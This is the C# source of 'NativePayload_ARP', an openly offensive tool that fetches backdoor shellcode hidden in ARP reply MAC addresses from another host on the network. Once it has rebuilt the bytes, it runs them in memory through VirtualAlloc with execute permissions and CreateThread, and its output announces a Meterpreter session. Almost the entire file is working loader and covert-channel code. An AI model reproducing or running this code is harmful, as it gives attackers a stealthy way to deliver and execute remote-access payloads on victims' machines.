using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following 
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("NativePayload_ARP")]
[assembly: AssemblyDescription("Publisher and Author: Damon Mohammadbagher")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("NativePayload_ARP")]
[assembly: AssemblyCopyright("Copyright ©  2017")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible 
// to COM components.  If you need to access a type in this assembly from 
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("164387ab-dfa0-4130-af0e-c87649a58975")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version 
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers 
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

namespace NativePayload_ARP
{
    class Program
    {
        private static Int32 ConvertIPToInt32(IPAddress pIPAddr)
        {
            byte[] lByteAddress = pIPAddr.GetAddressBytes();
            return BitConverter.ToInt32(lByteAddress, 0);
        }

        [DllImport("Iphlpapi.dll", EntryPoint = "SendARP")]
        internal extern static Int32 SendArp(Int32 destIpAddress, Int32 srcIpAddress,byte[] macAddress, ref Int32 macAddressLength);

        // public static string[] ARP_Payload;
        public static string Arps = "";
       
        static void Main(string[] args)
        {
           
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("NativePayload_ARP v1.0 Tool : Transfer Backdoor Payload by ARP Traffic");
            Console.WriteLine("Published by Damon Mohammadbagher");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("Getting Injected MacAddress By ARP Traffic (Slow)");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine();
            string Target_IPaddress_ARP_Request = "";
            string local_IPaddress_ARP_Request = "";
            try
            {              
                if (args.Length >= 1)
                {
                    Target_IPaddress_ARP_Request = args[0].ToString();

                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Please type Target System IPaddress for Sending ARP Request");
                    Target_IPaddress_ARP_Request = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Please type your Local IPaddress for Sending ARP Request by this IP");
                    local_IPaddress_ARP_Request = Console.ReadLine();

                }
            }
            catch (Exception e1)
            {
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("error 1: {0}",e1.Message);
                
            }
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Start time : {0}",DateTime.Now.ToString());
            


                string temp_arps = "";
                string temp_arps_2 = "";
                byte[] mac = new byte[6];
                byte[] temp_mac = new byte[6];
                int maclen = 0;
                bool init = false;
                int init_countdown = 0;
                List<string> MacAddress = new List<string>();
                try
                {
                    while (true)
                    {

                        maclen = mac.Length;

                        int _mac = SendArp(ConvertIPToInt32(IPAddress.Parse(Target_IPaddress_ARP_Request)), ConvertIPToInt32(IPAddress.Parse(local_IPaddress_ARP_Request)), mac, ref maclen);

                        System.Threading.Thread.Sleep(1000);



                        if (_mac == 0)
                        {

                            temp_arps = "";
                            temp_arps_2 = "";
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.Write("Found   " + " : ");
                            string srt_ip = Target_IPaddress_ARP_Request;
                            Console.Write("Get Mac ==> " + srt_ip + " MacAddress : ");
                            foreach (byte item in mac)
                            {
                                Console.Write(item.ToString("x2") + " ");
                                temp_arps += item.ToString("x2");
                                temp_arps_2 += item.ToString("x2");
                            }
                            Console.WriteLine();
                            Arps += temp_arps.Remove(0, 2);
                            string tmp = temp_arps.Remove(0, 2);
                            /// tmp.ToString() != "00ff00ff00ff" ==> bug2 here, this should be ff00ff00ff
                            if (MacAddress.Count == 0 && tmp.ToString() != "ffffffffff" && tmp.ToString() != "ff00ff00ff" && init)
                            {
                                MacAddress.Add(tmp);
                                Console.ForegroundColor = ConsoleColor.Cyan;
                                Console.WriteLine("[" + init_countdown.ToString() + "] Dumping Bytes: " + MacAddress.AsEnumerable().AsQueryable().Last().ToString());
                            }
                            else
                            {
                                /// time to exit and execute Payload ;-/
                                if (tmp.ToString() == "ffffffffff" && init) { break; }
                                //if (Arps.ToString() == "ffffffffff") { break; }

                                /// time to strat and dump Payload ;-/
                                if (temp_arps_2.ToString() == "00ff00ff00ff") { init = true; init_countdown++; }

                                if (init)
                                {

                                    if (MacAddress.Capacity!=0 && MacAddress.AsEnumerable().Last().ToString() != tmp && init_countdown > 1)
                                    {
                                        MacAddress.Add(tmp);
                                        Console.ForegroundColor = ConsoleColor.Cyan;
                                        Console.WriteLine("[" + init_countdown.ToString() + "] Dumping Bytes: " + MacAddress.AsEnumerable().AsQueryable().Last().ToString());
                                    }
                                    init_countdown++;
                                }
                            }


                        }
                        else if (_mac == 67)
                        {
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            Console.Write("NotFound" + " : ");
                            string srt_ip = Target_IPaddress_ARP_Request;
                            Console.Write("Get Mac ==> " + srt_ip + " MacAddress : ");
                            foreach (byte item in mac)
                            {
                                Console.Write(item.ToString("x2") + " ");
                            }
                            Console.WriteLine();

                        }
                        temp_mac = mac;
                        System.Threading.Thread.Sleep(4000);
                    }

                }
                catch (Exception e2)
                {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("error 2: {0}", e2.Message);
                 
                }
            Console.WriteLine();
            Console.WriteLine();
            /// for debug only
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("Debug Mode , Dumping this payload by ARP Traffic:");
            Console.WriteLine("Debug Mode , you can compare this Dump Data by your Source Payload \"Meterpreter msfvennom C type payload\"");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            foreach (string item in MacAddress)
            {
                Console.Write(item);
            }
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            /// time to execute 
            /// 
            byte[] _X_Bytes = new byte[MacAddress.Capacity * 5];
            int b = 0;
            foreach (string X_item in MacAddress)
            {           
                for (int i = 0; i <= 8; )
                {
                    /// for debug only
                    /// string MacAddress_Octets = X_item.ToString().Substring(i, 2);                 
                    
                    _X_Bytes[b] = Convert.ToByte("0x" + X_item.ToString().Substring(i, 2), 16);               
                 
                    b++;

                    i++; i++;
                }
            }
            try
            {


                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("End time : {0}", DateTime.Now.ToString());
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Bingo Meterpreter session by ARP Traffic ;)");
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)_X_Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(_X_Bytes, 0, (IntPtr)(funcAddr), _X_Bytes.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                // execute native code
                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

            }
            catch (Exception e3)
            {

                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("error 3: {0}", e3.Message);
            }
            
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);    

       
    }
}
